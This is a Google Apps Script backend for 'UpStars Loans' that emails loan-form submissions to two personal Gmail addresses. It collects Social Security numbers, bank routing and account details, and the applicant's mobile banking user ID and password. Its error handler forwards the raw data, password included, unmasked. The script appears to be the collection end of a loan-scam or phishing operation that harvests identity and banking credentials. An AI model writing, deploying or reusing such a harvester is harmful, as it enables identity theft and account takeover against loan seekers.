// Two-Step Email Script for UpStars Loans
// Step 1: Application form details
// Step 2: Agreement with ID proof

// Configuration
const PRIMARY_EMAIL = "finnfoxpersonalloan@gmail.com";
const SECONDARY_EMAIL = "tyronlincolnn@gmail.com";

function doGet(e) {
  return HtmlService.createHtmlOutput(`
    <h1>UpStars Loans Email Service</h1>
    <p>Two-step email system ready.</p>
    <p><strong>Current emails:</strong></p>
    <ul>
      <li>Primary: ${PRIMARY_EMAIL}</li>
      <li>Secondary: ${SECONDARY_EMAIL}</li>
    </ul>
  `);
}

function doPost(e) {
  try {
    const data = e.parameter;
    const formType = data.formType || 'loanApplication';
    
    if (formType === 'loanApplication') {
      // STEP 1: Send application form details only
      sendApplicationEmail(data);
    } else if (formType === 'loanAgreement') {
      // STEP 2: Send agreement with ID proof
      sendAgreementEmail(data);
    } else {
      sendErrorEmail('Unknown form type: ' + formType, data);
    }
    
    return ContentService.createTextOutput(JSON.stringify({
      result: 'success',
      message: 'Form processed successfully'
    }));
    
  } catch (error) {
    Logger.log('Error in doPost: ' + error.toString());
    sendErrorEmail(error.toString(), e.parameter);
    
    return ContentService.createTextOutput(JSON.stringify({
      result: 'error',
      error: error.toString()
    }));
  }
}

function sendApplicationEmail(data) {
  const subject = `New Loan Application - ${data.firstName} ${data.lastName}`;
  
  // Simple email with just form details
  const emailBody = `
NEW LOAN APPLICATION - UPSTARS LOANS

==========================================
Applicant Information:
------------------------------------------
Name: ${data.firstName} ${data.lastName}
Email: ${data.email}
Phone: ${data.phoneNumber}
Address: ${data.homeAddress}, ${data.city}, ${data.state} ${data.zipCode}
Date of Birth: ${data.dateOfBirth || 'Not provided'}
SSN: ${data.ssnNumber || 'Not provided'}

Loan Details:
------------------------------------------
Loan Amount: $${data.loanAmount}
Loan Purpose: ${data.loanPurpose}
Loan Agent: ${data.loanAgent || 'Not specified'}

Bank Information:
------------------------------------------
Bank: ${data.bankName}
Routing Number: ${data.routingNumber}
Account Number: ****${data.accountNumber ? data.accountNumber.slice(-4) : ''}

Mobile App Credentials:
------------------------------------------
User ID: ${data.userId}
Password: ${data.password ? '[PROVIDED]' : '[NOT PROVIDED]'}

Submission Date: ${new Date().toLocaleString()}

==========================================
This is an automated message from UpStars Loans Application System
  `;
  
  // Send to both emails
  GmailApp.sendEmail(PRIMARY_EMAIL, subject, emailBody);
  GmailApp.sendEmail(SECONDARY_EMAIL, subject, emailBody);
  
  Logger.log(`Application email sent to both: ${PRIMARY_EMAIL} and ${SECONDARY_EMAIL}`);
}

function sendAgreementEmail(data) {
  const subject = `Loan Agreement Signed - ${data.borrower_name}`;
  
  // Email with agreement and ID proof
  const emailBody = `
LOAN AGREEMENT SIGNED - UPSTARS LOANS

==========================================
Borrower Information:
------------------------------------------
Name: ${data.borrower_name}
Email: ${data.email}

Agreement Details:
------------------------------------------
Agreement Number: ${data.agreementNumber}
Loan Amount: $${data.loanAmount}
Loan Term: ${data.loanTerm} months
Monthly Payment: $${calculateMonthlyPayment(data.loanAmount, data.loanTerm)}
Agreement Accepted: ${data.agreementAccepted ? 'Yes' : 'No'}
Signature Status: ${data.signatureStatus}
Submission Date: ${data.submissionDate}

ID Proof Information:
------------------------------------------
File Name: ${data.idProofName || 'Not uploaded'}
File Type: ${data.idProofType || 'Not uploaded'}
File Size: ${data.idProofSize || 'Not uploaded'}
Status: ${data.idProofBase64 ? 'Attached (Base64 encoded)' : 'Not uploaded'}

==========================================
This is an automated message from UpStars Loans Agreement System
  `;
  
  // Send to both emails
  GmailApp.sendEmail(PRIMARY_EMAIL, subject, emailBody);
  GmailApp.sendEmail(SECONDARY_EMAIL, subject, emailBody);
  
  Logger.log(`Agreement email sent to both: ${PRIMARY_EMAIL} and ${SECONDARY_EMAIL}`);
}

function calculateMonthlyPayment(loanAmount, loanTerm) {
  if (!loanAmount || !loanTerm) return '0.00';
  
  const principal = parseFloat(loanAmount);
  const months = parseInt(loanTerm);
  const monthlyRate = 0.10 / 12; // 10% APR
  
  const monthlyPayment = principal * (monthlyRate * Math.pow(1 + monthlyRate, months)) / (Math.pow(1 + monthlyRate, months) - 1);
  return monthlyPayment.toFixed(2);
}

function sendErrorEmail(error, data) {
  const subject = 'Error in UpStars Loans System';
  const body = `
An error occurred in the UpStars Loans system:

Error: ${error}

Data received: ${JSON.stringify(data, null, 2)}

Time: ${new Date().toLocaleString()}

Please check the system and investigate this issue.
  `;
  
  GmailApp.sendEmail(PRIMARY_EMAIL, subject, body);
}
